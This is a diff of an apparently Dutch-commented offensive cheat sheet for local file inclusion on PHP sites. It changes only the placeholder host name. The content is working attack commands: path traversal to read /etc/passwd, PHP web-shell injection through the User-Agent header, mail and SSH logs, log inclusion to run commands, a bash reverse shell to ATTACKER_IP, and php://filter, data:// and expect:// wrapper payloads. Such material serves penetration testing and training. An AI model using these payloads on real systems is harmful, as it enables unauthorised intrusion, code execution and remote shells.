@@ -5,46 +5,46 @@
 # Nginx: /var/log/nginx/access.log
 # Windows: C:\xampp\apache\logs\access.log
 # Test LFI:
-curl "http://TARGET/page.php?file=../../../etc/passwd"
-curl "http://TARGET/page.php?file=....//....//....//etc/passwd"
+curl "http://TARGET_IP/page.php?file=../../../etc/passwd"
+curl "http://TARGET_IP/page.php?file=....//....//....//etc/passwd"
 # === Stap 2: Log toegang verifiëren ===
-curl "http://TARGET/page.php?file=../../../var/log/apache2/access.log"
+curl "http://TARGET_IP/page.php?file=../../../var/log/apache2/access.log"
 # === Stap 3: PHP code injecteren via User-Agent ===
-curl -A "<?php system(\$_GET['cmd']); ?>" "http://TARGET/"
+curl -A "<?php system(\$_GET['cmd']); ?>" "http://TARGET_IP/"
 # Of via netcat (meer controle):
-# nc TARGET 80
+# nc TARGET_IP 80
 # GET / HTTP/1.1
-# Host: TARGET
+# Host: TARGET_IP
 # User-Agent: <?php system($_GET['cmd']); ?>
 # === Stap 4: Command execution via log inclusion ===
-curl "http://TARGET/page.php?file=../../../var/log/apache2/access.log&cmd=id"
-curl "http://TARGET/page.php?file=../../../var/log/apache2/access.log&cmd=whoami"
+curl "http://TARGET_IP/page.php?file=../../../var/log/apache2/access.log&cmd=id"
+curl "http://TARGET_IP/page.php?file=../../../var/log/apache2/access.log&cmd=whoami"
 # Reverse shell:
-curl "http://TARGET/page.php?file=../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/443%200>%261'"
+curl "http://TARGET_IP/page.php?file=../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/443%200>%261'"
 # === Alternatief: Mail log poisoning ===
 # Stuur email naar target server:
-# telnet TARGET 25
+# telnet TARGET_IP 25
 # MAIL FROM: <attacker@test.com>
-# RCPT TO: <www-data@TARGET>
+# RCPT TO: <www-data@TARGET_IP>
 # DATA
 # <?php system($_GET['cmd']); ?>
 # .
 # Include mail log:
-curl "http://TARGET/page.php?file=../../../var/mail/www-data&cmd=id"
+curl "http://TARGET_IP/page.php?file=../../../var/mail/www-data&cmd=id"
 # === Alternatief: SSH log poisoning ===
 # Inject PHP in SSH auth log:
-ssh '<?php system($_GET["cmd"]); ?>'@TARGET
+ssh '<?php system($_GET["cmd"]); ?>'@TARGET_IP
 # Include:
-curl "http://TARGET/page.php?file=../../../var/log/auth.log&cmd=id"
+curl "http://TARGET_IP/page.php?file=../../../var/log/auth.log&cmd=id"
 # === Alternatief: /proc/self/environ ===
-curl -A "<?php system(\$_GET['cmd']); ?>" "http://TARGET/page.php?file=../../../proc/self/environ&cmd=id"
+curl -A "<?php system(\$_GET['cmd']); ?>" "http://TARGET_IP/page.php?file=../../../proc/self/environ&cmd=id"
 # === PHP Wrappers (zonder log poisoning) ===
 # Base64 encode broncode:
-curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=page.php"
+curl "http://TARGET_IP/page.php?file=php://filter/convert.base64-encode/resource=page.php"
 # Data wrapper (directe code execution):
-curl "http://TARGET/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+curl "http://TARGET_IP/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
 # Expect wrapper:
-curl "http://TARGET/page.php?file=expect://id"
+curl "http://TARGET_IP/page.php?file=expect://id"
 # Tip: URL-encode speciale tekens in commands (&=%26, spatie=%20)
 # Tip: Als access.log niet werkt, probeer error.log
 # Tip: PHP wrappers werken alleen als allow_url_include=On
